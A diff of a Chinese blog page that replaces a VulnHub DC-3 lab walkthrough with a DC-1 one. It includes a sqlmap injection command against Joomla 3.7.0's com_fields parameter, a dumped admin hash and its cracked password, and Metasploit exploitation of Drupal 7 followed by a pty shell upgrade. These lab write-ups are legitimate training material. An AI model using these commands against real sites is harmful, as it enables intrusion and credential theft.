@@ -14,63 +14,56 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2023/09/08/dc-3打靶记录/"/>
+    <link rel="canonical" href="http://example.com/2023/09/09/dc-1打靶记录/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="DC-3靶机打靶记录一、环境搭建靶机下载地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-32,312&#x2F;  下载得到是一个ova文件 我们这里直接使用kali导入就行  设置靶机名字和虚拟机存放位置 报错解决： 在我们启动靶机的时候可能会遇到这个报错： 1234IDE设备(磁盘&#x2F;CD-ROM)配置不正确。&quot;ide0:1&quot;上具有一个IDE从设备，但没有主设备">
+        <meta name="description" content="一、靶机搭建靶机下载地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-1,292&#x2F;  下载得到是一个ova文件 我们这里直接使用kali导入就行  设置靶机名字和虚拟机存放位置 然后直接启动虚拟机就可以了  二、信息收集靶机发现因为目标靶机和我们的攻击机是在同一网段，我们这里直接扫描网段存活主机就行了 1nmap -sn 192.168.113.0&#x2F;24   通过存活主机扫描">
 <meta property="og:type" content="article">
-<meta property="og:title" content="DC-3靶机打靶记录">
-<meta property="og:url" content="http://example.com/2023/09/08/DC-3%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:title" content="DC-1打靶记录">
+<meta property="og:url" content="http://example.com/2023/09/09/DC-1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="DC-3靶机打靶记录一、环境搭建靶机下载地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-32,312&#x2F;  下载得到是一个ova文件 我们这里直接使用kali导入就行  设置靶机名字和虚拟机存放位置 报错解决： 在我们启动靶机的时候可能会遇到这个报错： 1234IDE设备(磁盘&#x2F;CD-ROM)配置不正确。&quot;ide0:1&quot;上具有一个IDE从设备，但没有主设备">
+<meta property="og:description" content="一、靶机搭建靶机下载地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-1,292&#x2F;  下载得到是一个ova文件 我们这里直接使用kali导入就行  设置靶机名字和虚拟机存放位置 然后直接启动虚拟机就可以了  二、信息收集靶机发现因为目标靶机和我们的攻击机是在同一网段，我们这里直接扫描网段存活主机就行了 1nmap -sn 192.168.113.0&#x2F;24   通过存活主机扫描">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908200000681.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908200247081.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908200530705.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908201529638.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908201709732.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908201925144.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202310941.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202351755.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909142915814.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909143322829.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909143555072.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909144813909.png">
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202528547.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202751453.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908203241480.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908203525617.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908203717910.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908203959594.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908204055600.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908204418801.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908204755292.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205056490.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205218049.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205307778.png">
-<meta property="og:image" content="c:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230908205403689.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205554965.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205652193.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205710976.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205735037.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205758952.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205841726.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205857858.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205913820.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210019246.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210223367.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210303889.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210524256.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210745836.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211034760.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211053135.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211156826.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211221597.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211436246.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211653792.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211714171.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211747289.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211833124.png">
-<meta property="article:published_time" content="2023-09-08T13:28:46.000Z">
-<meta property="article:modified_time" content="2023-09-08T13:29:38.111Z">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909155519077.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909155744088.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909155926867.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909160939336.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161031876.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161209344.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161311501.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161423066.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161622967.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161706448.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161914430.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909162118874.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909162337296.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909162533641.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909162734376.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909163008070.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909163130086.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909164443711.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909164733153.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909165101345.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909165214519.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909165307393.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909165341004.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909165806415.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909170505396.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909170723993.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909170820781.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909171428691.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909171717246.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909172414215.png">
+<meta property="article:published_time" content="2023-09-09T09:45:17.000Z">
+<meta property="article:modified_time" content="2023-09-09T09:46:10.714Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="渗透-靶机-DC系列">
 <meta name="twitter:card" content="summary">
@@ -85,7 +78,7 @@
     
     <title>
         
-            DC-3靶机打靶记录 -
+            DC-1打靶记录 -
         
         JU blog
     </title>
@@ -414,7 +407,7 @@
             
             
                 <div class="article-title">
-                    <h1 class="article-title-regular">DC-3靶机打靶记录</h1>
+                    <h1 class="article-title-regular">DC-1打靶记录</h1>
                 </div>
             
                 
@@ -436,15 +429,15 @@
                             <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2023-09-08 21:28:46</span>
-        <span class="mobile">2023-09-08 21:28</span>
+        <span class="desktop">2023-09-09 17:45:17</span>
+        <span class="mobile">2023-09-09 17:45</span>
         <span class="hover-info">创建</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-09-08 21:29:38</span>
-            <span class="mobile">2023-09-08 21:29</span>
+            <span class="desktop">2023-09-09 17:46:10</span>
+            <span class="mobile">2023-09-09 17:46</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -466,12 +459,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.4k 字</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.7k 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>5 分钟</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>6 分钟</span>
         </span>
     
     
@@ -483,7 +476,7 @@
             
 
             <div class="article-content markdown-body">
-                <h1 id="DC-3靶机打靶记录"><a href="#DC-3靶机打靶记录" class="headerlink" title="DC-3靶机打靶记录"></a>DC-3靶机打靶记录</h1><h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><p>靶机下载地址：<a class="link"   target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-32,312/" >https://www.vulnhub.com/entry/dc-32,312/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+                <h1 id="一、靶机搭建"><a href="#一、靶机搭建" class="headerlink" title="一、靶机搭建"></a>一、靶机搭建</h1><p>靶机下载地址：<a class="link"   target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1,292/" >https://www.vulnhub.com/entry/dc-1,292/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>下载得到是一个ova文件</p>
 <p>我们这里直接使用kali导入就行</p>
 <p><img  
@@ -493,368 +486,333 @@
                       alt="image-20230908200000681"
                 ></p>
 <p>设置靶机名字和虚拟机存放位置</p>
-<p>报错解决：</p>
-<p>在我们启动靶机的时候可能会遇到这个报错：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IDE设备(磁盘/CD-ROM)配置不正确。&quot;ide0:1&quot;上具有一个IDE从设备，</span><br><span class="line">但没有主设备。此配置在虚拟机中无法正常运行。</span><br><span class="line">请使用配置编辑器将磁盘/CD-ROM 从&quot;ide0:1&quot;移到&quot;ide0:0”。</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
+<p>然后直接启动虚拟机就可以了</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908200247081.png"
-                      alt="image-20230908200247081"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909142915814.png"
+                      alt="image-20230909142915814"
                 ></p>
-<p>把这里按报错修改为0：0就行</p>
-<p>然后就可以正常启动靶机</p>
-<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>攻击机和靶机是在同一网段，所以我们这里可以使用arp协议来扫描存活主机</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908200530705.png"
-                      alt="image-20230908200530705"
-                ></p>
-<p>可以扫描我们靶机的ip地址</p>
-<p>或者使用nmap命令</p>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h2 id="靶机发现"><a href="#靶机发现" class="headerlink" title="靶机发现"></a>靶机发现</h2><p>因为目标靶机和我们的攻击机是在同一网段，我们这里直接扫描网段存活主机就行了</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.113.0/24</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908201529638.png"
-                      alt="image-20230908201529638"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909143322829.png"
+                      alt="image-20230909143322829"
                 ></p>
-<p>可以得到我们靶机的ip地址为192.168.113.147</p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>我们已经得到了目标靶机的ip地址，接下来就是要扫描靶机开放了那些端口</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 -O -p 0-65535 192.168.113.147</span><br></pre></td></tr></table></figure></div>
+<p>通过存活主机扫描可以得到我们的目标靶机的ip地址为192.168.113.148</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>扫描目标靶机开放的端口</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 -O -p 0-65535 192.168.113.148</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908201709732.png"
-                      alt="image-20230908201709732"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909143555072.png"
+                      alt="image-20230909143555072"
                 ></p>
-<p>根据扫描结果可以看到开放了一个80端口</p>
-<h1 id="三、漏洞扫描挖掘与利用"><a href="#三、漏洞扫描挖掘与利用" class="headerlink" title="三、漏洞扫描挖掘与利用"></a>三、漏洞扫描挖掘与利用</h1><p>访问80端口的web服务</p>
-<p><img  
+<p>可以看到开放了221端口和80端口</p>
+<p>根据扫描结果我们可以看出开启了ssh服务和web服务</p>
+<p>访问对应的web服务</p>
+<h1 id="三、漏洞扫描与利用"><a href="#三、漏洞扫描与利用" class="headerlink" title="三、漏洞扫描与利用"></a>三、漏洞扫描与利用</h1><p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908201925144.png"
-                      alt="image-20230908201925144"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909144813909.png"
+                      alt="image-20230909144813909"
                 ></p>
-<p>访问主页面告诉了我们的目标，拿下服务器root权限</p>
-<p>首页是一个登录页面</p>
-<p>尝试弱口令登录没有成功</p>
-<p>也不存在sql注入</p>
-<p>用dirserach扫描目录文件</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.113.147/ </span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202310941.png"
-                      alt="image-20230908202310941"
-                ></p>
-<p>发现扫描到了管理员后台</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202351755.png"
-                      alt="image-20230908202351755"
-                ></p>
-<p>访问后台是一个管理员登录页面</p>
-<p>尝试弱口令字典爆破</p>
+<p>主页面是一个登录页面</p>
+<p>尝试管理员账号弱口令登录</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202528547.png"
                       alt="image-20230908202528547"
                 ></p>
-<p>弱口令爆破失败</p>
-<p>尝试使用sqlmap尝试登录页面是否存在sql注入</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202751453.png"
-                      alt="image-20230908202751453"
-                ></p>
-<p>不存在sql注入</p>
-<p>我们观察这个后台登录页面发现使用的cms是joomla</p>
-<p>但是我们并不知道版本号</p>
-<p>获取版本号可以用joomla的专用扫描器 joomscan扫描</p>
-<p>安装命令：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install joomscan</span><br></pre></td></tr></table></figure></div>
-
-<p>使用命令：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u ip</span><br></pre></td></tr></table></figure></div>
+<p>没有爆出来密码</p>
+<p>使用whatweb工具进行指纹识别</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v 192.168.113.148</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908203241480.png"
-                      alt="image-20230908203241480"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909155519077.png"
+                      alt="image-20230909155519077"
                 ></p>
-<p>我们这里可以得到cms的版本号</p>
-<p>使用searchsploit去漏洞库搜索一下看有没有该版本的漏洞</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla 3.7.0</span><br></pre></td></tr></table></figure></div>
+<p>指纹识别出来这是一个drupal 7的cms</p>
+<p>这里使用msfconsole进行漏洞的搜索和利用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908203525617.png"
-                      alt="image-20230908203525617"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909155744088.png"
+                      alt="image-20230909155744088"
                 ></p>
-<p>可以看到在3.7.0的joomla中存在sql注入漏洞</p>
-<p>把漏洞利用exp复制当前文件夹</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 42033.txt</span><br></pre></td></tr></table></figure></div>
+<p>漏洞检索</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search Drupal</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908203717910.png"
-                      alt="image-20230908203717910"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909155926867.png"
+                      alt="image-20230909155926867"
                 ></p>
-<p>exp中给了sqlmap的使用命令</p>
-<p>这里直接使用sqlmap去进行漏洞利用</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.113.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure></div>
+<p>这里漏洞很多</p>
+<p>但是测试只有编号为1的可以使用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909160939336.png"
+                      alt="image-20230909160939336"
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">options</span><br></pre></td></tr></table></figure></div>
+
+<p>查看设置</p>
+<p>配置目标靶机地址，和攻击机地址，也就是本机地址</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161031876.png"
+                      alt="image-20230909161031876"
+                ></p>
+<p>设置完就可以输入exploit开始进行漏洞利用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161209344.png"
+                      alt="image-20230909161209344"
+                ></p>
+<p>利用成功</p>
+<p>这里进行getshell</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908203959594.png"
-                      alt="image-20230908203959594"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161311501.png"
+                      alt="image-20230909161311501"
                 ></p>
-<p>去爆破表</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.113.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -tables</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>可以看到一个flag1.txt</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161423066.png"
+                      alt="image-20230909161423066"
+                ></p>
+<p>意思是让查看一下配置文件</p>
+<p>网上可以搜索到durpal的配置文件的路径</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sites/default</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908204055600.png"
-                      alt="image-20230908204055600"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161622967.png"
+                      alt="image-20230909161622967"
                 ></p>
-<p>可以看到在表中有一个users表</p>
-<p>尝试爆表中全部数据</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.113.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#x27;#__users&#x27; --dump list[fullordering]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>我们这里起的是一个反向shell</p>
+<p>这里直接用python的 pty模块升级交互式shell</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908204418801.png"
-                      alt="image-20230908204418801"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161706448.png"
+                      alt="image-20230909161706448"
                 ></p>
-<p>获取到了账号 <code>admin</code>，密码 <code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p>
-<p>通过网上百度查询知道这个密码是Blowfish加密</p>
-<p>这里使用john进行暴力破解</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908204755292.png"
-                      alt="image-20230908204755292"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909161914430.png"
+                      alt="image-20230909161914430"
                 ></p>
-<p>经过解密我们可以得到密码为snoopy</p>
-<p>所以我们这里可以得到管理员的账号密码</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin：snoopy</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909162118874.png"
+                      alt="image-20230909162118874"
+                ></p>
+<p>flag2没有具体告诉我们flag3在哪里</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909162337296.png"
+                      alt="image-20230909162337296"
+                ></p>
+<p>但是我们可以找到</p>
+<p>数据库的账号密码，登录进入数据库看看有没有敏感信息</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909162533641.png"
+                      alt="image-20230909162533641"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
